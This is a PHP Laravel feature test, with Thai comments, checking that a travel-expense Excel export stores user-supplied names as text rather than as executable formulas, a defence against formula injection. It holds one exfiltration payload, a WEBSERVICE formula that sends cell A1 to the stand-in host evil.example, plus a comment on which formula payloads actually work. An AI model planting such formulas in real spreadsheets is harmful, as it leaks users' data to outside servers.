<?php

namespace Tests\Feature;

use App\Models\TravelExpenseClaim;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\TestCase;

/**
 * ตรวจว่าไฟล์ Excel ที่ส่งออกไม่ตีความข้อความของผู้ใช้เป็น "สูตร"
 *
 * ช่องโหว่เดิม (CWE-1236 — Excel Formula Injection): exporter เขียนชื่อ-นามสกุล
 * ด้วย setCellValue()/fromArray() ซึ่งจะส่งค่าให้ DefaultValueBinder ตรวจชนิด
 * และสตริงที่ขึ้นต้นด้วย "=" ซึ่ง "เป็นสูตรที่ถูกต้องตามไวยากรณ์" จะถูกสร้างเป็นสูตรจริง
 *
 * หมายเหตุ: payload แบบ DDE ("=cmd|...") ถูก parser ของ PhpSpreadsheet ปฏิเสธ
 * จึงถูกเก็บเป็นข้อความอยู่แล้ว — ตัวที่ใช้งานได้จริงคือสูตรที่ถูกไวยากรณ์ เช่น
 * WEBSERVICE (ดึงข้อมูลในชีตออกไปยังเซิร์ฟเวอร์ภายนอก) และ HYPERLINK
 */
class TravelExpenseFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    /**
     * สูตรที่ถูกต้องตามไวยากรณ์ Excel — ดึงค่าจากเซลล์อื่นส่งออกไปยัง URL ภายนอก
     * เมื่อไฟล์ถูกเปิด จึงเป็น payload ที่ต้องถูกบังคับให้เป็นข้อความ
     */
    private const PAYLOAD = '=WEBSERVICE("http://evil.example/?leak="&A1)';

    public function test_exported_names_starting_with_equals_are_stored_as_text(): void
    {
        $finance = User::create([
            'name'     => 'Finance',
            'username' => 'finance_formula',
            'email'    => 'finance_formula@example.test',
            'password' => bcrypt('secret-password'),
            'role'     => 'finance',
        ]);

        $created = $this->actingAs($finance)
            ->postJson('/api/finance/travel-expense-claims', [
                'fiscal_year'      => 2569,
                'claim_period'     => '2026-06-01',
                'expense_category' => TravelExpenseClaim::CATEGORY_DOMESTIC,
                'status'           => 'confirmed',
                'items'            => [[
                    'first_name'       => self::PAYLOAD,
                    'last_name'        => 'ใจดี',
                    'allowance_amount' => 240,
                ]],
            ])
            ->assertCreated();

        $claimId = $created->json('data.id');

        $response = $this->actingAs($finance)
            ->get("/api/finance/travel-expense-claims/{$claimId}/export")
            ->assertOk();

        $spreadsheet = $this->loadExportedSpreadsheet($response->streamedContent());
        $sheet = $spreadsheet->getActiveSheet();

        $highestRow = $sheet->getHighestDataRow();
        $highestColumn = Coordinate::columnIndexFromString($sheet->getHighestDataColumn());

        $payloadCoordinate = null;

        for ($row = 1; $row <= $highestRow; $row++) {
            for ($column = 1; $column <= $highestColumn; $column++) {
                $coordinate = Coordinate::stringFromColumnIndex($column) . $row;
                $cell = $sheet->getCell($coordinate);

                $this->assertNotSame(
                    DataType::TYPE_FORMULA,
                    $cell->getDataType(),
                    "เซลล์ {$coordinate} ถูกตีความเป็นสูตร Excel (Formula Injection)"
                );

                if ($cell->getValue() === self::PAYLOAD) {
                    $payloadCoordinate = $coordinate;
                }
            }
        }

        // ข้อความต้องคงอยู่ครบถ้วน ไม่ถูกตัดหรือแปลงค่า
        $this->assertNotNull($payloadCoordinate, 'ไม่พบข้อความของผู้ใช้ในไฟล์ที่ส่งออก');

        $spreadsheet->disconnectWorksheets();
    }

    /**
     * เขียน binary ของ response ลงไฟล์ชั่วคราวแล้วอ่านกลับด้วย PhpSpreadsheet
     */
    private function loadExportedSpreadsheet(string $binary)
    {
        $path = tempnam(sys_get_temp_dir(), 'export_') . '.xlsx';
        file_put_contents($path, $binary);

        try {
            return IOFactory::load($path);
        } finally {
            @unlink($path);
        }
    }
}
